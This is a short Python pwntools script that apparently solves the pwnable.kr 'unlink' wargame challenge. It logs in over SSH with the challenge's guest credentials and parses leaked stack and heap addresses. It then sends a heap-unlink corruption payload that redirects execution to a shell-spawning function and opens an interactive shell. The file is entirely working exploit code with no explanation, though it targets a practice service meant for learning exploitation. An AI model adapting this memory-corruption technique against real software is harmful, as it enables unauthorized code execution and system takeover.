#!/usr/bin/env python2
from pwn import *

if __name__ == '__main__':
    s = ssh(host='pwnable.kr', user='unlink', port=2222, password='guest')
    sh = s.process('./unlink')
    #sh = process('./unlink')

   # gdb.attach(sh)

    print(sh.recvuntil(b'here is stack address leak: ', drop=True))
    stack_addr = int(sh.recvuntil(b'\n', drop=True), 16)
    ret_addr = stack_addr + 24;
    
    print(sh.recvuntil(b'here is heap address leak: ', drop=True))
    heap_addr = int(sh.recvuntil(b'\n', drop=True), 16)

    shell_addr = p32(0x80484eb)
    payload = shell_addr *4 + p32(heap_addr+12) +p32(stack_addr+16);
    #payload=16*'A'
    print(payload);
    sh.recvuntil(b'\n', drop=True)
    sh.sendline(payload)

    sh.interactive()    
    
    
    
    
    #payload=shell_addr + 'A'*12 + p32(heap_addr+12) +p32(stack_addr+16)
